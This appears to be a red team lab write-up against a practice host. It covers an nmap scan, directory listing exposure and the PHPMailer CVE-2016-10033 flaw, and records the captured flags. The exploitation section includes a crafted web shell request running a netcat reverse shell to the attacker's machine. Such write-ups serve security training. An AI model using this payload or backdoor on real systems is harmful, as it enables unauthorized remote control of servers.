# **Red Team: Summary of Operations**

## TARGET 2

### Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

---

## Exposed Services

Nmap scan results reveals the below services and OS details:

nmap -sV 192.168.1.115

![1](/Images/4/1.PNG)

---

## Critical Vulnerabilities

The CVE and CWE databases give us information of vulnerabilities found in the previous step. These vulnerabilities are potential points of entry:

Vulnerability | Description | Impact
---|---|---
**CWE-548** Exposure of information through directory browsing | A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers | Allowing an bad actor to obtain more information about your server could allow them to further their attack
**CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer | HPMailer allows extra parameters in the mail command and consequently executes arbitrary code | An attacker can execute commands on the web server remotely  allowing them to further compromise the target.

---

# Exploitation

The Red Team was able to penetrate Target 2 and retrieve the following confidential data:

**flag1.txt:**  `a2c1f66d28051bd3a5874b5b6r43e21`

- **CWE-548** Exposure of information through directory browsing
    
    Sensitive information was accessed without authorization through directory browsing. 
    
    The vendor directory has no restrictions and is accessible through the browser. It includes several sensitive files that leak information about the services in use, their versions, and the critical data `flag1{a2c1f66d28051bd3a5874b5b6r43e21}` in the PATH file.

    ---

    **Vendor Directory Index view from the browser** | PATH File: **Flag1** | **PHPMAILER version**
     ---|---|---
    ![1](/Images/4/6.PNG) | ![2](/Images/4/7.PNG) | ![4](/Images/4/9.PNG)    

---

**flag2.txt:**  `6a8ed560f0b5358ecf844108048eb337`

**flag3.txt:**  `a0f568aa9de277887f37730d71520d9b`

- **CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer

    The current version of PHPMailer in use (5.2.16) is vulnerable. It allows extra parameters in the mail command and consequently executes arbitrary code. Therefore, the exploited machine can establish stealthy communication with a Command and Control through a reverse shell that will bypass the inbound rules of a firewall.

    1. First, a customized script uploads a file to the vulnerable machine. The file allows the execution of NetCat in the exploited machine.

    2.  Second, a Command and Control is configured to listen using a NetCat command. 

    3. Finally, the exploited machine is instructed to call the Command and Control via a designed payload running in a browser. The payload has embedded a Netcat command to call the Command and Control machine.

        **Crafted payload:** `192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash`

        ![17](/Images/4/17.PNG)

        **Sensitive information was found in the "www" and "WordPress uploads" directory**    

        **flag2**

        ![19](/Images/4/19.PNG)

        **flag3**

        ![20](/Images/4/20.png)